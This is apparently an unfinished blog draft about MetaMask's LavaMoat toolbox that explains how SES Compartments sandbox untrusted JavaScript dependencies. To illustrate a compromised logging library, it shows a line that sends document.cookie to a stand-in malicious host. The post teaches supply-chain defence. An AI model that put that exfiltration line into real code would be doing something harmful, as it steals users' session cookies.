---
enabled: false
layout: post
tags:  Top,JavaScript,Research,The-Client-Side,Browser,LavaMoat
title: LavaTube - Expermintal JS tool for recursively walk through ???
url: https://weizman.github.io/
date: 14/05/2023
description: ???
keywords: javascript, web, browser, lavamoat, research, prototype, chain, recursive
---

> tl;dr - ???

## LavaMoat

This was [already communicated](https://metamask.io/news/security/using-lavamoat-to-solve-software-supply-chain-security/) 
multiple times online, so I won't go too much into details today, but the bottom line is 
that **MetaMask is putting more effort than most of the world into securing the client side of web applications in all sorts of ways.** 

We call this initiative [the LavaMoat toolbox](https://github.com/lavamoat/) in which we focus on the **security side of JavaScript and the client 
side apps we build on top of it**, where we face some interesting and very unique challenges.

We previously covered some of the tools in the toolbox:
* LavaMoat - [Using LavaMoat To Solve Software Supply Chain Security](https://metamask.io/news/security/using-lavamoat-to-solve-software-supply-chain-security/)
* Snow - [Introducing Snow: Securing Nested Ownership of Windows](https://github.com/lavamoat/snow/wiki/Introducing-Snow)

But today we'll focus on a smaller problem we had and the cool little experimental LavaMoat tool we built for facing it - **[LavaTube](https://github.com/LavaMoat/LavaTube/)!**

## Motivation

Working on decentralized applications inherently forces such client side products to be **more secure than other standard ones.**
This is because there isn't really a backend to leverage for traditional security architecture - **the security burden lies fully with the client side of the application.**

That is why, as mentioned above, we at MetaMask put more effort than most of the industry into building **the most secured client side applications we can.**
The tools we build are **generic enough for anyone to use to enhance their JavaScript products security**, but we use them specifically to secure different parts of MetaMask.

This situation forces us to come up and implement many unique solutions to this unique ecosystem (as partly listed above).
These different solutions act as separate protection layers where many of them are around making sure **executed code can only do and access what it should and nothing more.**

We (attempt to) accomplish this task by building on top of [Agoric](https://github.com/agoric)'s amazing [SES](https://github.com/endojs/endo/tree/master/packages/ses) technology, 
because thanks to the SES's [Compartment](https://github.com/endojs/endo/tree/master/packages/ses#compartment)s we can execute arbitrary code in its own virtual realm and provide it with a set of specific APIs we wish it would have while not worrying about it
managing to gain more power than intended. It also won't be able to compromise the integrity of other code running in the system if combined with SES's [lockdown](https://github.com/endojs/endo/tree/master/packages/ses#lockdown) and [harden](https://github.com/endojs/endo/tree/master/packages/ses#harden).

> If you're not familiar with these terms you should either try reading through without making full sense of it, or spend some time reading about [SES](https://github.com/endojs/endo/tree/master/packages/ses), [Compartments](https://github.com/endojs/endo/tree/master/packages/ses#compartment), [lockdown](https://github.com/endojs/endo/tree/master/packages/ses#lockdown), [harden](https://github.com/endojs/endo/tree/master/packages/ses#harden) and [realms](https://weizman.github.io/2022/10/28/what-is-a-realm-in-js)).

### Demonstration

Assume we build a simple program that tells you the time:

```html
<html>
  <head>
    <script>
      function tellTime() {
        console.log('telling time; ' + 'start');
        alert('time is: ' + new Date().toString());
        console.log('telling time; ' + 'end');
      }
    </script>
  </head>
  <body>
    <button onclick="tellTime()"> Click to know the time! </button>
  </body>
</html>
```

Since we LOVE using dependencies to make our lives easier, we better use a proper logging package instead of just calling `console.log`:

```javascript
globalThis.logger = function (msg) {
  console.log(msg);
}
```

```html
<html>
  <head>
    <script src="https://logger.com/lib.js"></script>
    <script>
      function tellTime() {
        logger('telling time; ' + 'start');
        alert('time is: ' + new Date().toString());
        logger('telling time; ' + 'end');
      }
    </script>
  </head>
  <body>
    <button onclick="tellTime()"> Click to know the time! </button>
  </body>
</html>
```

But what do we do if `logger`'s maintainer goes evil? Or compromised?

```javascript
globalThis.logger = function (msg) {
  console.log(msg);
}
fetch('https://malicious.com/stealCookies?data=' + document.cookie);
```

With Compartments, the threat can be eliminated completely:

```html
<html>
  <head>
    <script>
      globalThis.logger = (async function(){
        lockdown();
        const data = await fetch('https://logger.com/lib.js');
        const js = await data.text();
        const comp = new Compartment({console});
        comp.evaluate(js);
        return comp.globalThis.logger;
      }());
    </script>
    <script>
      function tellTime() {
        logger('telling time; ' + 'start');
        alert('time is: ' + new Date().toString());
        logger('telling time; ' + 'end');
      }
    </script>
  </head>
  <body>
    <button onclick="tellTime()"> Click to know the time! </button>
  </body>
</html>
```

The code above achieves the same effect, but instead of loading the untrusted dependency to the main realm of our app, we load it 
into a virtual realm (the compartment) and we only allow it to access `console`, so when the code evaluates it'll have access to `console` when it needs it,
but it won't be able to call `fetch`/`document.cookie` as it wasn't explicitly allowed (Agoric prefers using **endowed**).

## Problem

However, JavaScript being JavaScript, Not endowing a Compartment one specific API does not necessarily mean it isn't accessible otherwise...



### Background

In MetaMask we work hard on shipping our very own plugin system we call [MetaMask Snaps](https://metamask.io/snaps/).
Aside from it being a super interesting initiative in the Web3 ecosystem that **will unlock some really interesting capabilities**, 
it is quite a complicated task, **especially when you take JavaScript client side security as serious as we do.**

Without making things too complicated, you should know we implement multiple security layers for both MetaMask and Snaps, and some of those layers overlap.
One important security layer both implement is the use of [SES Compartments](https://github.com/endojs/endo/tree/master/packages/ses#compartment).

A SES Compartment is a virtual realm that comes with the full set of JavaScript intrinsics, in which code can be evaluated and cannot escape it:

```javascript
<script>
  const c = new Compartment();
  c.evaluate('');
</script>
```

